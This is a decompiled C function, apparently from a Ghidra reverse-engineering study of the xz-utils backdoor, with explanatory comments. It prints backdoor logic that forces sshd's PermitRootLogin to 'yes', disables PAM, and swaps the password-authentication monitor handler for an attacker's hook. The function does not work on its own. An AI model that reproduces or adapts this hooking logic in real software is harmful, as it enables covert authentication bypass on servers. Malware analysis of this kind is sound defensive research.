// /home/kali/xzre-ghidra/xzregh/107D50_sshd_patch_variables.c
// Function: sshd_patch_variables @ 0x107D50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_patch_variables(BOOL skip_root_patch, BOOL disable_pam, BOOL replace_monitor_reqtype, monitor_reqtype_t monitor_reqtype, global_context_t * global_ctx)


/*
 * AutoDoc: Requires the mm_answer_authpassword hook and metadata to have been recovered, then applies three optional tweaks: force
 * PermitRootLogin to the value `3` ("yes"), zero out `use_pam` when PAM should be disabled, and replace sshd's monitor
 * dispatch table entry with the attacker's authpassword hook. When `monitor_reqtype` isn't explicitly supplied it is
 * derived from the original dispatch table so the forged replies stay in lock-step with sshd's state machine.
 */
#include "xzre_types.h"

BOOL sshd_patch_variables
               (BOOL skip_root_patch,BOOL disable_pam,BOOL replace_monitor_reqtype,
               monitor_reqtype_t monitor_reqtype,global_context_t *global_ctx)

{
  int current_permit_root;
  sshd_ctx_t *sshd_ctx;
  sshd_monitor_func_t authpassword_hook;
  int *permit_root_login_ptr;
  uint *use_pam_ptr;
  
  // AutoDoc: Refuse to run until the global ctx, sshd_ctx, and mm_answer_authpassword hook are all populated.
  if ((((global_ctx == (global_context_t *)0x0) ||
       (sshd_ctx = global_ctx->sshd_ctx, sshd_ctx == (sshd_ctx_t *)0x0)) ||
      (authpassword_hook = sshd_ctx->mm_answer_authpassword_hook, authpassword_hook == (sshd_monitor_func_t)0x0)) ||
     (sshd_ctx->have_mm_answer_authpassword == FALSE)) {
    return FALSE;
  }
  // AutoDoc: Clamp PermitRootLogin to 3 ("yes") whenever the caller didn't explicitly skip the root tweak.
  if (skip_root_patch == FALSE) {
    permit_root_login_ptr = sshd_ctx->permit_root_login_ptr;
    if (permit_root_login_ptr == (int *)0x0) {
      return FALSE;
    }
    current_permit_root = *permit_root_login_ptr;
    if (current_permit_root < 3) {
      if (current_permit_root < 0) {
        return FALSE;
      }
      *permit_root_login_ptr = 3;
    }
    else if (current_permit_root != 3) {
      return FALSE;
    }
  }
  // AutoDoc: Zero `use_pam` only when sshd exposed a writable pointer and the payload asked for the PAM bypass.
  if (disable_pam != FALSE) {
    use_pam_ptr = (uint *)sshd_ctx->use_pam_ptr;
    if (use_pam_ptr == (uint *)0x0) {
      return FALSE;
    }
    if (1 < *use_pam_ptr) {
      return FALSE;
    }
    *use_pam_ptr = 0;
  }
  // AutoDoc: Derive the request ID from sshd's live dispatch table so forged replies stay in sync with the monitor state machine.
  if (replace_monitor_reqtype == FALSE) {
    monitor_reqtype = *(int *)(sshd_ctx->mm_answer_authpassword_slot + -1) + MONITOR_ANS_MODULI;
  }
  sshd_ctx->monitor_reqtype_authpassword = monitor_reqtype;
  // AutoDoc: Finally drop the attacker's hook into the genuine slot once every optional tweak is satisfied.
  *sshd_ctx->mm_answer_authpassword_slot = authpassword_hook;
  return TRUE;
}

